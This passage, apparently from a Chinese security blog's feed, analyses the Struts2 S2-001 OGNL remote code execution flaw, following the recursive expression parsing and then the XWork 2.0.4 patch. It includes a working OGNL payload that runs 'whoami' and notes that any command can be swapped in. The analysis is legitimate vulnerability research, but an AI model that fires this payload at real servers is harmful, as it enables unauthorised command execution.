class="number">2</span> 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在<span class="keyword">struts2核心配置文件struts.properties中默认开启。</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/13/5cb15a1922f79.png" alt><br>然后username经过上面处理之后，进入到该类下的<code>getValue</code>方法查询表达式的值，继续跟进。<br><img src="https://i.loli.net/2019/04/13/5cb15dcf9e97c.png" alt><br>在该方法中调用<code>TextParseUtil.translateVariables</code>。<br><img src="https://i.loli.net/2019/04/13/5cb15e428937d.png" alt><br>之后调用了该类下的同名方法<code>translateVariables</code>，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。<br>继续查看该方法，便可以看到使用了<code>while(true)</code>对表达式进行了递归处理。<br><img src="https://i.loli.net/2019/04/13/5cb15f12d6784.png" alt><br>之后便对表达式去掉<code>%{}</code>调用<code>stack.findValue</code>即<code>OgnlValueStack</code>类下的<code>findValue</code>，并最终调用了Ognl的<code>getValue</code>方法对表达式进行取值<br><img src="https://i.loli.net/2019/04/13/5cb15fe7d316b.png" alt><br>在<code>getValue</code>中可以看到取到了我们的payload<br><img src="https://i.loli.net/2019/04/13/5cb160217abad.png" alt><br>之后取得的值复制给<code>o</code>并最终复制给<code>expression</code>，继续在while循环中被处理。<br><img src="https://i.loli.net/2019/04/13/5cb161298df9b.png" alt><br>最终在OGNL表达式中被处理，获得计算结果<code>2</code>。<br><img src="https://i.loli.net/2019/04/13/5cb161c75292f.png" alt></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>POC<br><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="symbol">#a</span>=(new java.lang.<span class="type">ProcessBuilder</span>(new java.lang.<span class="type">String</span>[]&#123;<span class="comment">"whoami"</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),<span class="symbol">#b</span>=<span class="symbol">#a</span>.getInputStream(),<span class="symbol">#c</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#c</span>),<span class="symbol">#e</span>=new char[<span class="number">50000</span>],<span class="symbol">#d</span>.read(<span class="symbol">#e</span>),<span class="symbol">#f</span>=<span class="symbol">#context</span>.get(<span class="comment">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),<span class="symbol">#f</span>.getWriter().println(new java.lang.<span class="type">String</span>(<span class="symbol">#e</span>)),<span class="symbol">#f</span>.getWriter().flush(),<span class="symbol">#f</span>.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>new java.lang.String[]{&quot;whoami&quot;}</code>即可执行任意命令</p><p>如需参数可这样利用<code>new java.lang.String[]{&quot;net&quot;,&quot;user&quot;}</code></p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p>在<code>XWork2.0.4</code>增加了loopCount判断以取消对OGNL的递归解析<br><img src="https://i.loli.net/2019/04/13/5cb1b1bce7cb1.png" alt></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05  参考"></a>0x05  参考</h2><p><a href="http://d1iv3.me/2018/02/01/S2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">S2-001漏洞分析</a><br><a href="https://wystatic.tuisec.win/static/drops/papers-340.html" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a><br><a href="https://www.sqyysec.com/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Struts-001远程代码执行漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第一篇文章，还是决定以漏洞之王&lt;code&gt;struts2&lt;/code&gt;下手，本
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
</feed>
